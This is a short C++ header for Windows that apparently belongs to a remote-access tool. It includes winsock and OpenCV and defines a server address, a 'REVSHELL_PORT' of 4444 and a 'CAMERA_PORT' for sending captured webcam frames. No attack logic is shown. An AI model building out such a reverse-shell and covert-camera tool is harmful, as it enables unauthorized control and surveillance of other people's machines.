#pragma once

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <opencv2/opencv.hpp>
#include <chrono>
#include <cstdio> 

//codes
#define ERROR 0

//server details
#define SERVER_IP "127.0.0.1"
#define REVSHELL_PORT 4444
#define CAMERA_PORT 3333

#define BUFFER_SIZE 1024
#define FRAME "frame.png"

#define LENGTH 4

using cv::VideoCapture;
using cv::Mat;
using cv::imwrite;

using std::endl;
using std::cerr;
using std::string;
using std::thread;
using std::cout;
using std::ios;
